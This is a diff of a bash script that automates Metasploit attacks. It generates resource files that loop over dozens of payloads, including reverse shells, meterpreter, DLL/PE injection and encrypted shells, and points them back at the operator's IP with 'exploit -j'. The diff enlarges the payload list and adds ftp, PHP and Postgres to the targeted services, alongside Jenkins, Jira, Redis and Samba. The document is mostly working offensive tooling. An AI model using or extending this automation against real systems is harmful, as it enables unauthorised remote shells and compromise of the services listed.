@@ -17,44 +17,60 @@ myip=$(ip addr show dev $(ip route |awk '/default/ {print $5}')|awk '/inet / {pr
 echo 'color false' > "$cmdfile"
 BORDER='##################################################' 
 
-#        cmd/unix/pingback_bind \
-#        cmd/unix/pingback_reverse \
-#        cmd/unix/reverse_awk \
-#        cmd/unix/reverse_python \
-#        cmd/unix/reverse_perl \
-#        generic/shell_reverse_tcp \
-#        java/meterpreter/reverse_tcp \
-#        linux/aarch64/meterpreter/reverse_tcp \
-#        linux/x64/pingback_bind_tcp \
-#        linux/x64/pingback_reverse_tcp \
-#        linux/x86/meterpreter/reverse_tcp \
-#        multi/meterpreter/reverse_http \
-#        python/pingback_bind_tcp \
-#        python/pingback_reverse_tcp \
-#        ruby/pingback_bind_tcp \
-#        ruby/pingback_reverse_tcp \
-#        php/meterpreter/reverse_tcp \
-#        windows/meterpreter/reverse_tcp \
-#        windows/pingback_bind_tcp \
-#        windows/pingback_reverse_tcp \
-#        windows/x64/pingback_reverse_tcp 
 
 function echocmd()
 {
     for payload in \
         cmd/unix/pingback_bind \
         cmd/unix/pingback_reverse \
+        cmd/unix/reverse \
+        cmd/unix/reverse_awk \
+        cmd/unix/reverse_bash \
+        cmd/unix/reverse_bash_udp \
+        cmd/unix/reverse_netcat \
+        cmd/unix/reverse_openssl \
+        cmd/unix/reverse_perl \
+        cmd/unix/reverse_python \
+        cmd/unix/reverse_ruby \
+        cmd/windows/generic \
+        cmd/windows/reverse_powershell \
         generic/shell_reverse_tcp \
         java/meterpreter/reverse_tcp \
+        linux/aarch64/meterpreter/reverse_tcp \
+        linux/aarch64/shell_reverse_tcp \
+        linux/aarch64/shell/reverse_tcp \
         linux/x64/pingback_bind_tcp \
         linux/x64/pingback_reverse_tcp \
         linux/x86/meterpreter/reverse_tcp \
         multi/meterpreter/reverse_http \
         php/meterpreter/reverse_tcp \
+        python/pingback_bind_tcp \
+        python/pingback_reverse_tcp \
+        python/shell_reverse_tcp \
+        python/shell_reverse_udp \
+        ruby/pingback_bind_tcp \
+        ruby/pingback_reverse_tcp \
+        ruby/shell_reverse_tcp \
+        windows/dllinject/reverse_tcp \
+        windows/dllinject/reverse_tcp_dns \
+        windows/encrypted_shell/reverse_tcp \
         windows/meterpreter/reverse_tcp \
+        windows/peinject/reverse_tcp \
+        windows/peinject/reverse_tcp_dns \
         windows/pingback_bind_tcp \
         windows/pingback_reverse_tcp \
-        windows/x64/pingback_reverse_tcp 
+        windows/shell/reverse_nonx_tcp \
+        windows/shell/reverse_tcp \
+        windows/shell_reverse_tcp \
+        windows/shell/reverse_tcp_dns \
+        windows/shell/reverse_tcp_uuid \
+        windows/shell/reverse_udp \
+        windows/x64/encrypted_shell/reverse_tcp \
+        windows/x64/peinject/reverse_tcp \
+        windows/x64/pingback_reverse_tcp \
+        windows/x64/shell/reverse_tcp \
+        windows/x64/shell_reverse_tcp \
+        windows/x64/shell/reverse_tcp_uuid
     do
         if [[ $exploit =~ 'windows' ]] && [[ ! $payload =~ 'windows' ]]
         then
@@ -100,7 +116,7 @@ function echocmd()
         echo "set SRVHOST $myip" >> "$cmdfile"
         echo "set SSL $SSL" >> "$cmdfile"
         echo "exploit -j" >> "$cmdfile"
-        echo "sleep .2" >> "$cmdfile"
+        echo "sleep .5" >> "$cmdfile"
     done
 
     echo "jobs" >> "$cmdfile"
@@ -168,12 +184,15 @@ do
                 Apache \
                 Consul \
                 docker \
+                ftp \
                 git \
                 JBoss \
                 jdwp \
                 Jenkins \
                 Jira \
                 MySQL \
+                PHP \
+                Postgres \
                 redis \
                 Samba \
                 Solr \
